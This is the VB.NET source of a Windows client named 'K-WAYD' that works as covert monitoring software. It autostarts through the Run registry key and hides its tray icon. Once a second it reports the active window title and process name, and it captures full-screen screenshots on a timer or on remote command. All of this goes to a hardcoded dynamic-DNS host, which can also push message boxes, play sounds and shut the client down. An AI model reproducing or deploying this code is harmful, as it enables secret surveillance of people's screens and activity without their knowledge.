
#Region " K-WAYD (Client) "

#Region " FMenu "

Public Class FMenu

#Region " Variables "

#Region " Declaraciones "

    <Runtime.InteropServices.DllImport("user32.dll")> Private Shared Function GetForegroundWindow() As IntPtr : End Function
    <Runtime.InteropServices.DllImport("user32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto)> Private Shared Function GetWindowText(hWnd As IntPtr, lpString As Text.StringBuilder, nMaxCount As Integer) As Integer : End Function
    <Runtime.InteropServices.DllImport("user32.dll")> Private Shared Function GetWindowThreadProcessId(hWnd As IntPtr, ByRef lpdwProcessId As Integer) As Integer : End Function

#End Region

    Public RegName As String = "K-WAYD 1.0 (Client)"
    Public Version As String = "1.0"

    Public WithEvents Cliente As New Cliente
    Public DireccionIP As String
    Public IPAddress As Net.IPAddress
    Public Puerto As Integer = 26010

    Public IniciarWindows, CapturaAutomatica As Boolean
    Dim Mensaje As String = ""
    Public CTimer As New Timer With {.Interval = 1, .Enabled = True}
    Dim CapturaTimer As New Timer With {.Interval = 5000, .Enabled = True}
    Dim Notify As New NotifyIcon With {.Text = "K-WAYD 1.0 (Client)", .Visible = False, .Icon = My.Resources.Icono}

    Dim Cerrando As Boolean

#End Region

#Region " Eventos del Formulario "

#Region " Load "

    Private Sub FMenu_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Opciones_Cargar()
        AddHandler CTimer.Tick, AddressOf CTimer_Tick
        AddHandler CapturaTimer.Tick, AddressOf CapturaTimer_Tick
        AddHandler Notify.Click, AddressOf Notify_Click
        Notify.ContextMenuStrip = CMenu
    End Sub

#End Region

#Region " Closing "

    Private Sub FMenu_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        CapturaTimer.Stop() : CTimer.Stop() : Cliente.Desconectar()
    End Sub

#End Region

#End Region

#Region " Funciones "

#Region " Cargar "

    Public Sub Opciones_Cargar()
        DireccionIP = Registro.GetRegKey(RegName, "DireccionIP", "kobayashi82.ddns.net") : ValidarIP(DireccionIP)
        Puerto = CInt(Registro.GetRegKey(RegName, "Puerto", "26010"))

        IniciarWindows = CBool(Registro.GetRegKey(RegName, "IniciarWindows", "True"))
        If IniciarWindows = True Then Registro.Registrar() Else Registro.DesRegistrar()
        CapturaAutomatica = CBool(Registro.GetRegKey(RegName, "CapturaAutomatica", "False"))
        CapturaTimer.Interval = CInt(Registro.GetRegKey(RegName, "CapturaAutomaticaTimer", "5000"))
    End Sub

    Private Sub ValidarIP(IP As String)
        Try
            If FSettings.IsValidIPAddress(IP) = True Then
                IPAddress = Net.IPAddress.Parse(IP)
            Else
                Dim HostAddresses() As Net.IPAddress = Net.Dns.GetHostAddresses(IP)
                If HostAddresses.Length > 0 Then IPAddress = HostAddresses(0) Else IPAddress = Net.IPAddress.Parse(DireccionIP)
            End If
        Catch : IPAddress = Net.IPAddress.Parse("127.0.0.1") : End Try
    End Sub

    Public Function ValidarIP2(IP As String) As Net.IPAddress
        Try
            If FSettings.IsValidIPAddress(IP) = True Then
                Return Net.IPAddress.Parse(IP)
            Else
                Dim HostAddresses() As Net.IPAddress = Net.Dns.GetHostAddresses(IP)
                If HostAddresses.Length > 0 Then Return HostAddresses(0) Else Return Net.IPAddress.Parse(DireccionIP)
            End If
        Catch : Return Net.IPAddress.Parse("127.0.0.1") : End Try
    End Function

#End Region

#Region " Guardar "

    Public Sub Opciones_Guardar()
        Registro.SetRegKey(RegName, "DireccionIP", DireccionIP.ToString)
        Registro.SetRegKey(RegName, "Puerto", Puerto.ToString)
        Registro.SetRegKey(RegName, "IniciarWindows", IniciarWindows.ToString)
        Registro.SetRegKey(RegName, "CapturaAutomatica", CapturaAutomatica.ToString)
        Registro.SetRegKey(RegName, "CapturaAutomaticaTimer", CapturaTimer.Interval.ToString)
    End Sub

#End Region

#Region " Play Sound "

    Private Sub Play_Sound(Sonido As String)
        Select Case Sonido
            Case "Alarma 1" : My.Computer.Audio.Play(My.Resources.Alarma1, AudioPlayMode.Background)
            Case "Alarma 2" : My.Computer.Audio.Play(My.Resources.Alarma2, AudioPlayMode.Background)
            Case "Background" : My.Computer.Audio.Play(My.Resources.Background, AudioPlayMode.Background)
            Case "Balloon" : My.Computer.Audio.Play(My.Resources.Balloon, AudioPlayMode.Background)
            Case "Battery Critical" : My.Computer.Audio.Play(My.Resources.BatteryCritical, AudioPlayMode.Background)
            Case "Battery Low" : My.Computer.Audio.Play(My.Resources.BatteryLow, AudioPlayMode.Background)
            Case "Calendar" : My.Computer.Audio.Play(My.Resources.Calendar, AudioPlayMode.Background)
            Case "Camera" : My.Computer.Audio.Play(My.Resources.Camera, AudioPlayMode.Background)
            Case "Chimes" : My.Computer.Audio.Play(My.Resources.Chimes, AudioPlayMode.Background)
            Case "Chord" : My.Computer.Audio.Play(My.Resources.Chord, AudioPlayMode.Background)
            Case "Connection" : My.Computer.Audio.Play(My.Resources.Connection, AudioPlayMode.Background)
            Case "Control" : My.Computer.Audio.Play(My.Resources.Control, AudioPlayMode.Background)
            Case "Default" : My.Computer.Audio.Play(My.Resources._Default, AudioPlayMode.Background)
            Case "Ding" : My.Computer.Audio.Play(My.Resources.Ding, AudioPlayMode.Background)
            Case "Email" : My.Computer.Audio.Play(My.Resources.Email, AudioPlayMode.Background)
            Case "Error" : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background)
            Case "Exclamation" : My.Computer.Audio.Play(My.Resources.Exclamation, AudioPlayMode.Background)
            Case "Foreground" : My.Computer.Audio.Play(My.Resources.Foreground, AudioPlayMode.Background)
            Case "Generic" : My.Computer.Audio.Play(My.Resources.Generic, AudioPlayMode.Background)
            Case "Hardware Fail" : My.Computer.Audio.Play(My.Resources.Fail, AudioPlayMode.Background)
            Case "Harware Insert" : My.Computer.Audio.Play(My.Resources.Insert, AudioPlayMode.Background)
            Case "Hardware Remove" : My.Computer.Audio.Play(My.Resources.Remove, AudioPlayMode.Background)
            Case "LogOff" : My.Computer.Audio.Play(My.Resources.Logoff, AudioPlayMode.Background)
            Case "LogOn" : My.Computer.Audio.Play(My.Resources.Logon, AudioPlayMode.Background)
            Case "Message" : My.Computer.Audio.Play(My.Resources.Message, AudioPlayMode.Background)
            Case "Messaging" : My.Computer.Audio.Play(My.Resources.Messaging, AudioPlayMode.Background)
            Case "Notification 1" : My.Computer.Audio.Play(My.Resources.Notification, AudioPlayMode.Background)
            Case "Notification 2" : My.Computer.Audio.Play(My.Resources.Notify1, AudioPlayMode.Background)
            Case "Notification 3" : My.Computer.Audio.Play(My.Resources.Notify2, AudioPlayMode.Background)
            Case "Print" : My.Computer.Audio.Play(My.Resources.Print, AudioPlayMode.Background)
            Case "Recycle" : My.Computer.Audio.Play(My.Resources.Recycle, AudioPlayMode.Background)
            Case "Ring 1" : My.Computer.Audio.Play(My.Resources.Ring1, AudioPlayMode.Background)
            Case "Ring 2" : My.Computer.Audio.Play(My.Resources.Ring2, AudioPlayMode.Background)
            Case "Ring 3" : My.Computer.Audio.Play(My.Resources.Ring3, AudioPlayMode.Background)
            Case "Shutdown" : My.Computer.Audio.Play(My.Resources.Shutdown, AudioPlayMode.Background)
            Case "Stop" : My.Computer.Audio.Play(My.Resources._Stop, AudioPlayMode.Background)
            Case "Tada" : My.Computer.Audio.Play(My.Resources.Tada, AudioPlayMode.Background)
            Case "Unlock" : My.Computer.Audio.Play(My.Resources.Unlock, AudioPlayMode.Background)
        End Select
    End Sub

#End Region

#End Region

#Region " Controles "

#Region " Notify Icon "

    Private Sub Notify_Click(sender As Object, e As MouseEventArgs)

    End Sub

#Region " Menu "

    Private Sub MAjustes_Click(sender As Object, e As EventArgs) Handles MAjustes.Click
        FSettings.ShowDialog()
    End Sub

    Private Sub MSalir_Click(sender As Object, e As EventArgs) Handles MSalir.Click
        End
    End Sub

#End Region

#End Region

#End Region

#Region " Cliente "

#Region " Auto Captura "

    Private Sub CapturaTimer_Tick(sender As Object, e As EventArgs)
        If Cliente.isConectado = False Or CapturaAutomatica = False Then Exit Sub
        Dim Imagen As Image
        Dim Screen As Screen = Screen.FromPoint(Cursor.Position)

        Dim CaptureBounds As New Rectangle(Screen.Bounds.Left, Screen.Bounds.Top, Screen.Bounds.Width, Screen.Bounds.Height)
        Using Bitmap As New Bitmap(CaptureBounds.Width, CaptureBounds.Height)
            Using Graphics As Graphics = Graphics.FromImage(Bitmap)
                Graphics.CopyFromScreen(CaptureBounds.Location, Point.Empty, CaptureBounds.Size)
            End Using

            Try : If IO.File.Exists("temp.jpg") Then IO.File.Delete("temp.jpg")
            Catch : Exit Sub : End Try

            Bitmap.Save("temp.jpg", Imaging.ImageFormat.Jpeg)
            Imagen = LoadImageClone("temp.jpg")

            Try : If IO.File.Exists("temp.jpg") Then IO.File.Delete("temp.jpg")
            Catch : Exit Sub : End Try
        End Using

        If Imagen IsNot Nothing Then Cliente.Enviar("IMAGEN", Imagen)
    End Sub

#End Region

#Region " Conexion "

    Private Async Sub CTimer_Tick(sender As Object, e As EventArgs)
        If CTimer.Interval = 1 Then CTimer.Interval = 1000
        Dim Ping As New Net.NetworkInformation.Ping
        If Ping.Send("www.google.com").Status <> Net.NetworkInformation.IPStatus.Success Then Exit Sub
        Dim ForegroundWindow As IntPtr = GetForegroundWindow()
        Dim WindowTitle As New Text.StringBuilder(256)
        Dim ProcessId As Integer
        Dim ProcessName As String
        Dim Process As Process = Nothing

        GetWindowText(ForegroundWindow, WindowTitle, WindowTitle.Capacity)
        GetWindowThreadProcessId(ForegroundWindow, ProcessId)
        Try : Process = Process.GetProcessById(ProcessId) : Catch : End Try
        If Process IsNot Nothing Then ProcessName = Process.ProcessName

        Dim TempMensaje As String = Process.ProcessName + "|" + WindowTitle.ToString.Replace("|", "@-@")

        If TempMensaje.ToLower.Contains("k-wayd") Then Notify.Visible = True Else Notify.Visible = False
        If Cliente.isConectado = False AndAlso Cliente.Conectando = False Then Await (Cliente.Conectar(IPAddress, Puerto)) : Exit Sub
        If Cliente.isConectado = True Then
            If TempMensaje <> Mensaje Then Mensaje = TempMensaje : Cliente.Enviar(Mensaje)
        End If
    End Sub

#End Region

#Region " Conectado "

    Private Sub Cliente_Conectado() Handles Cliente.Conectado
        If InvokeRequired Then : Invoke(Sub() Cliente_Conectado()) : Else
            If Not String.IsNullOrEmpty(Environment.MachineName) Then Cliente.Enviar("NOMBREEQUIPO|" + Environment.MachineName + "|" + CapturaAutomatica.ToString + "|" + (CapturaTimer.Interval / 1000).ToString) Else Cliente.Enviar("NOMBREEQUIPO|Sin Nombre" + "|" + CapturaAutomatica.ToString + "|" + (CapturaTimer.Interval / 1000).ToString)
            CTimer_Tick(Nothing, Nothing)
            Try
                Dim Imagen As Image
                Dim Screen As Screen = Screen.FromPoint(Cursor.Position)

                Dim CaptureBounds As New Rectangle(Screen.Bounds.Left, Screen.Bounds.Top, Screen.Bounds.Width, Screen.Bounds.Height)
                Using Bitmap As New Bitmap(CaptureBounds.Width, CaptureBounds.Height)
                    Using Graphics As Graphics = Graphics.FromImage(Bitmap)
                        Graphics.CopyFromScreen(CaptureBounds.Location, Point.Empty, CaptureBounds.Size)
                    End Using

                    Try : If IO.File.Exists("temp.jpg") Then IO.File.Delete("temp.jpg")
                        'Catch ex As Exception : MsgBox("Cliente_Conectado 0" + vbCrLf + vbCrLf + ex.Message) : Exit Sub : End Try
                    Catch : Exit Sub : End Try

                    Bitmap.Save("temp.jpg", Imaging.ImageFormat.Jpeg)
                    Imagen = LoadImageClone("temp.jpg")

                    Try : If IO.File.Exists("temp.jpg") Then IO.File.Delete("temp.jpg")
                        'Catch ex As Exception : MsgBox("Cliente_Conectado 1" + vbCrLf + vbCrLf + ex.Message) : Exit Sub : End Try
                    Catch : Exit Sub : End Try
                End Using

                If Imagen IsNot Nothing Then Cliente.Enviar("IMAGEN", Imagen)
                'Catch ex As Exception : MsgBox("Cliente_Conectado 2" + vbCrLf + vbCrLf + ex.Message) : End Try
            Catch : End Try
        End If
    End Sub

#End Region

#Region " Desconectado "

    Private Sub Cliente_Desconectado() Handles Cliente.Desconectado
        If InvokeRequired Then : Invoke(Sub() Cliente_Desconectado()) : Else

        End If
    End Sub

#End Region

#Region " Recibido "

    Private Sub Cliente_Recibido(Mensaje As String) Handles Cliente.Recibido
        If InvokeRequired Then : Invoke(Sub() Cliente_Recibido(Mensaje)) : Else
            Dim cMensaje As String = Mensaje.Split("|")(0)
            Select Case cMensaje
                Case "BUZZ"
                    Play_Sound("Connection")
                Case "PLAYSOUND"
                    Play_Sound(Mensaje.Split("|")(1))
                Case "MENSAJE"
                    TopMost = True : Activate() : Focus()
                    Dim Icono As MsgBoxStyle
                    Select Case Mensaje.Split("|")(1)
                        Case "Information" : Icono = MsgBoxStyle.Information
                        Case "Question" : Icono = MsgBoxStyle.Question
                        Case "Exclamation" : Icono = MsgBoxStyle.Exclamation
                        Case "Error" : Icono = MsgBoxStyle.Critical
                    End Select

                    Dim Respuesta As MsgBoxStyle
                    Select Case Mensaje.Split("|")(2)
                        Case "Aceptar" : Respuesta = MsgBoxStyle.OkOnly
                        Case "Aceptar/Cancelar" : Respuesta = MsgBoxStyle.OkCancel
                        Case "Reintentar/Cancelar" : Respuesta = MsgBoxStyle.RetryCancel
                        Case "Si/No" : Respuesta = MsgBoxStyle.YesNo
                        Case "Si/No/Cancelar" : Respuesta = MsgBoxStyle.YesNoCancel
                    End Select
                    Dim RespuestaFinal As MsgBoxResult = MsgBox(Mensaje.Split("|")(4), Icono + Respuesta, Mensaje.Split("|")(3))
                    Cliente.Enviar(Mensaje.Replace("MENSAJE|", "RESPUESTA|") + "|" + RespuestaFinal.ToString)
                    TopMost = False
                Case "AUTOCAPTURA"
                    CapturaAutomatica = CBool(Mensaje.Split("|")(1)) : Opciones_Guardar()
                Case "AUTOCAPTURAINTERVAL"
                    CapturaTimer.Interval = CInt(Mensaje.Split("|")(1)) : Opciones_Guardar()
                Case "CAPTURA"
                    Dim Imagen As Image
                    Dim Screen As Screen = Screen.FromPoint(Cursor.Position)

                    Dim CaptureBounds As New Rectangle(Screen.Bounds.Left, Screen.Bounds.Top, Screen.Bounds.Width, Screen.Bounds.Height)
                    Using Bitmap As New Bitmap(CaptureBounds.Width, CaptureBounds.Height)
                        Using Graphics As Graphics = Graphics.FromImage(Bitmap)
                            Graphics.CopyFromScreen(CaptureBounds.Location, Point.Empty, CaptureBounds.Size)
                        End Using

                        Try : If IO.File.Exists("temp.jpg") Then IO.File.Delete("temp.jpg")
                        Catch : Exit Sub : End Try

                        Bitmap.Save("temp.jpg", Imaging.ImageFormat.Jpeg)
                        Imagen = LoadImageClone("temp.jpg")

                        Try : If IO.File.Exists("temp.jpg") Then IO.File.Delete("temp.jpg")
                            'Catch ex As Exception : MsgBox("Cliente_Recibido" + vbCrLf + vbCrLf + ex.Message) : Exit Sub : End Try
                        Catch : Exit Sub : End Try
                    End Using

                    If Imagen IsNot Nothing Then Cliente.Enviar("IMAGEN", Imagen)
                Case "CERRAR"
                    End
            End Select
        End If
    End Sub

#Region " Load Image Clone "

    Private Function LoadImageClone(Ruta As String) As Image
        Try : Dim bmpOriginal As Image = Image.FromFile(Ruta) : Dim bmpClone As New Bitmap(bmpOriginal.Width, bmpOriginal.Height) : Dim gr As Graphics = Graphics.FromImage(bmpClone)
            gr.SmoothingMode = Drawing2D.SmoothingMode.None : gr.InterpolationMode = Drawing2D.InterpolationMode.NearestNeighbor : gr.PixelOffsetMode = Drawing2D.PixelOffsetMode.HighSpeed
            gr.DrawImage(bmpOriginal, 0, 0, bmpOriginal.Width, bmpOriginal.Height) : gr.Dispose() : bmpOriginal.Dispose() : Return bmpClone
            'Catch ex As Exception : MsgBox("LoadImageClone" + vbCrLf + vbCrLf + ex.Message) : End Try : Return Nothing
        Catch : End Try : Return Nothing
    End Function

#End Region

#End Region

#End Region

End Class

#End Region

#Region " Registro "

Public Class Registro

#Region " SubKeys (carpetas) "

    ' Devuelve un array con los SubKeys (carpetas) de la ruta del registro indicada
    Public Shared Function GetRegKeyNames(SubKey As String) As String()
        Try : My.Computer.Registry.CurrentUser.CreateSubKey("Software\" + SubKey) : Using Reg = My.Computer.Registry.CurrentUser.OpenSubKey("Software\" + SubKey, True)
                Return Reg.GetSubKeyNames : End Using
        Catch : Return New String(0) {} : End Try
    End Function

    ' Elimina el SubKey (carpeta) de la ruta del registro indicada
    Public Shared Sub DelReg(SubKey As String)
        Try : My.Computer.Registry.CurrentUser.DeleteSubKeyTree("Software\" + SubKey, False)
        Catch : End Try
    End Sub

#End Region

#Region " ValueNames (archivos) "

    ' Devuelve un array con los ValueNames (archivos) de la ruta del registro indicada
    Public Shared Function GetRegValueNames(SubKey As String) As String()
        Try : My.Computer.Registry.CurrentUser.CreateSubKey("Software\" + SubKey) : Using Reg = My.Computer.Registry.CurrentUser.OpenSubKey("Software\" + SubKey, True)
                Return Reg.GetValueNames : End Using
        Catch : Return New String(0) {} : End Try
    End Function

    ' Devuelve el valor del ValueName (archivo) de la ruta del registro indicada
    Public Shared Function GetRegKey(SubKey As String, Name As String, Optional DefaultValue As String = "") As String
        Try : My.Computer.Registry.CurrentUser.CreateSubKey("Software\" + SubKey) : Using Reg = My.Computer.Registry.CurrentUser.OpenSubKey("Software\" + SubKey, True)
                If Reg.GetValue(Name) = "" Then Reg.SetValue(Name, DefaultValue)
                Return Reg.GetValue(Name) : End Using
        Catch : Return "" : End Try
    End Function

    ' Establece el valor del ValueName (archivo) de la ruta del registro indicada
    Public Shared Sub SetRegKey(SubKey As String, Name As String, Value As String)
        Try : My.Computer.Registry.CurrentUser.CreateSubKey("Software\" + SubKey) : Using Reg = My.Computer.Registry.CurrentUser.OpenSubKey("Software\" + SubKey, True)
                Reg.SetValue(Name, Value) : End Using
        Catch : End Try
    End Sub

    ' Elimina el ValueName (archivo) de la ruta del registro indicada
    Public Shared Sub DelRegKey(SubKey As String, Name As String)
        Try : My.Computer.Registry.CurrentUser.CreateSubKey("Software\" + SubKey) : Using Reg = My.Computer.Registry.CurrentUser.OpenSubKey("Software\" + SubKey, True)
                Reg.DeleteValue(Name, False) : End Using
        Catch : End Try
    End Sub

#End Region

#Region " Iniciar con Windows "

    ' Registra la aplicacion para que se inicie con Windows
    Public Shared Sub Registrar(Optional Nombre As String = "", Optional Ruta As String = "")
        If Nombre = "" Then Nombre = Application.ProductName
        If Ruta = "" Then Ruta = Application.ExecutablePath
        Try : Using Reg = My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True) : Reg.SetValue(Nombre, Ruta) : End Using
        Catch : End Try
    End Sub

    'Elimina del registro la aplicacion para que no se inicie con Windows
    Public Shared Sub DesRegistrar(Optional Nombre As String = "")
        If Nombre = "" Then Nombre = Application.ProductName
        If My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).GetValue(Nombre) Is Nothing Then Exit Sub
        Try : Using Reg = My.Computer.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True) : Reg.DeleteValue(Nombre) : End Using
        Catch : End Try
    End Sub

#End Region

End Class

#End Region

#Region " Cliente "

Public Class Cliente

#Region " Variables "

#Region " Eventos "

    Public Event Recibido(Mensaje As String)
    Public Event Conectado()
    Public Event Desconectado()

#End Region

    Public Conectando, isConectado As Boolean
    Private Cliente As Net.Sockets.TcpClient
    Private Stream As Net.Sockets.NetworkStream

#End Region

#Region " Metodos "

#Region " Conectar "

    Public Async Function Conectar(DireccionIP As Net.IPAddress, Puerto As Integer) As Task
        Try
            If Cliente IsNot Nothing AndAlso Cliente.Connected = True Then Cliente.Close()
            Conectando = True
            Cliente = New Net.Sockets.TcpClient()
            Await Cliente.ConnectAsync(DireccionIP, Puerto)
            Stream = Cliente.GetStream()

            isConectado = True : Conectando = False
            RaiseEvent Conectado()

            Dim ReceiveThread As New Threading.Thread(AddressOf Recibir_Mensajes)
            ReceiveThread.Start()
        Catch : Conectando = False : End Try
    End Function

#End Region

#Region " Enviar "

    Public Sub Enviar(Mensaje As String, Optional Imagen As Bitmap = Nothing)
        Try
            Dim TipoDato As String = "Texto"
            If Mensaje = "IMAGEN" Then TipoDato = "Imagen"

            Dim TipoDatoBytes() As Byte = Text.Encoding.UTF8.GetBytes(TipoDato)
            Dim Longitud As Integer = TipoDatoBytes.Length

            Stream.Write(BitConverter.GetBytes(Longitud), 0, 4)
            Stream.Write(TipoDatoBytes, 0, Longitud)

            If TipoDato = "Texto" Then
                Dim ContenidoBytes() As Byte = Text.Encoding.UTF8.GetBytes(Mensaje)
                Longitud = ContenidoBytes.Length
                Stream.Write(BitConverter.GetBytes(Longitud), 0, 4)
                Stream.Write(ContenidoBytes, 0, Longitud)
            ElseIf TipoDato = "Imagen" Then
                Longitud = ImageToByteArray(Imagen).Length
                Stream.Write(BitConverter.GetBytes(Longitud), 0, 4)
                Stream.Write(ImageToByteArray(Imagen), 0, Longitud)
            End If
            Stream.Flush()
            'Catch ex As Exception : MsgBox("Enviar" + vbCrLf + vbCrLf + ex.Message) : End Try
        Catch : End Try
    End Sub

    Private Function ImageToByteArray(Imagen As Bitmap) As Byte()
        Try
            Dim ms As New IO.MemoryStream()
            Imagen.Save(ms, Imaging.ImageFormat.Jpeg)
            Return ms.ToArray()
            'Catch ex As Exception : MsgBox("ImageToByteArray" + vbCrLf + vbCrLf + ex.Message) : End Try : Return Nothing
        Catch : End Try : Return Nothing
    End Function

#End Region

#Region " Desconectar "

    Public Sub Desconectar()
        Try
            Cliente.Close()
        Catch : Finally
            isConectado = False
            RaiseEvent Desconectado()
        End Try
    End Sub

#End Region

#Region " Recibir "

    Private Sub Recibir_Mensajes()
        Dim Buffer As Byte() = New Byte(1023) {}
        Dim BytesRead As Integer

        Try
            While True
                BytesRead = Stream.Read(Buffer, 0, Buffer.Length)
                If BytesRead = 0 Then Exit While ' El servidor se desconectó

                Dim Mensaje As String = Text.Encoding.ASCII.GetString(Buffer, 0, BytesRead)
                RaiseEvent Recibido(Mensaje)
            End While
            'Catch ex As Exception : MsgBox("Recibir_Mensajes" + vbCrLf + vbCrLf + ex.Message) : Finally
        Catch : Finally
            Cliente.Close()
            isConectado = False : Conectando = False
            RaiseEvent Desconectado()
        End Try
    End Sub

#End Region

#End Region

End Class

#End Region

#End Region